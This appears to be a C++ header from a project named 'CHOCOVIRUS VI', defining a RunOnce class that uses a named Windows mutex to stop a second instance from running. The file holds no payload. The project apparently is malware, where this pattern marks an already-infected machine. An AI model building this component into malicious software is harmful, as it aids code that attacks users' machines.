//
// CHOCOVIRUS VI
// (C) 2019 modeco80 and CHOCOLATEMAN.
//
// File:
//		runonce.hh
//
// Description:
//		run once helper
//
#pragma once

#include <Common.hh>

class RunOnce {
	HANDLE hRUMutex = NULL;
public:
	template<class Callback> inline RunOnce(const char* ident, Callback failedCb) {
		this->hRUMutex = OpenMutex(MUTEX_ALL_ACCESS, -1, ident);
		if(this->hRUMutex) {
			Blitz::Util::DebugLog("Mutex found");
			failedCb();
			ExitProcess(0);
		} else {
			this->hRUMutex = CreateMutex(0, 0, ident);
		}
	}

	inline ~RunOnce() { if(this->hRUMutex) ReleaseMutex(this->hRUMutex); }
};
